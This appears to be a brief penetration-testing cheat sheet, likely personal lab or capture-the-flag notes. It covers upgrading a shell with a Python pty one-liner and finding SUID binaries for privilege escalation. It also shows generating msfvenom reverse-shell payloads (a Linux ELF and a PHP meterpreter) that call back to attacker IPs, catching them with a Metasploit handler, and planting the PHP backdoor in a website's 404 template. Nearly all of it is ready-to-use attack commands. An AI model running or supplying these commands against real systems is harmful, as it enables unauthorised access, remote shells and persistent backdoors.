Upgrade terminal
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
___
To find Root Processes
```
find / -perm +6000 2>/dev/null | grep '/bin/'
```
___
MsfVenom
```
In Attackers pc: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=4040 -f elf > r.elf
Upload the r.elf to webshell and excuite it to get the reverse shell

OR

1. Generate backdoor

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=4444 -f raw -o payload.php

2. Create our payload handler

msfconsole
$ use exploit/multi/handler
$ set payload php/meterpreter/reverse_tcp
$ set LHOST 192.168.0.32
$ set LPORT 4444
$ run

3. Paste the payload.php at the 404 Tamplate
```


